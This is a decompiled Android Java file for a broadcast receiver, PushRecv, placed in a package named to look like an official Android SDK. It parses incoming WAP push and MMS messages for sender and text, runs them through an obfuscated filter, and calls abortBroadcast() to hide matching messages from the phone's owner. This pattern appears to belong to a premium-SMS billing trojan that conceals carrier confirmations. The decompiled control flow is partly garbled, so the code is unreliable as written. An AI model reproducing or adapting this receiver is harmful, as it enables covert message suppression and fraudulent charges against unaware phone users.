package com.android.sdk.rec;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.android.sdk.pay.ActivityTool;
import com.android.sdk.pay.x;
import com.google.android.mms.pdu.EncodedStringValue;
import com.google.android.mms.pdu.GenericPdu;
import com.google.android.mms.pdu.PduParser;

public class PushRecv
  extends BroadcastReceiver
{
  private static final String a = PushRecv.class.getSimpleName();
  
  public PushRecv() {}
  
  private static String a(EncodedStringValue paramEncodedStringValue)
  {
    if (paramEncodedStringValue != null) {
      return paramEncodedStringValue.getString();
    }
    return "";
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    try
    {
      ActivityTool.b(a, paramIntent.toString());
      String str1 = "";
      Object localObject = paramIntent.getByteArrayExtra("data");
      String str2 = new String((byte[])localObject);
      if (paramIntent.getType().contains("application/vnd.wap.mms-message"))
      {
        localObject = a(new PduParser((byte[])localObject).parse().getFrom());
        paramIntent = str1;
      }
      for (;;)
      {
        ActivityTool.checkAppStatus(paramContext);
        if ((!x.a().a((String)localObject, paramIntent)) && (!((String)localObject).equals(""))) {
          break;
        }
        abortBroadcast();
        return;
        localObject = ActivityTool.a(paramIntent.getStringExtra("address"));
        paramIntent = ActivityTool.a(paramIntent.getStringExtra("NotifyText"));
        boolean bool = paramIntent.equals("");
        if (bool) {
          paramIntent = str2;
        }
      }
    }
    catch (Exception paramContext)
    {
      abortBroadcast();
      paramContext.printStackTrace();
      return;
    }
  }
}
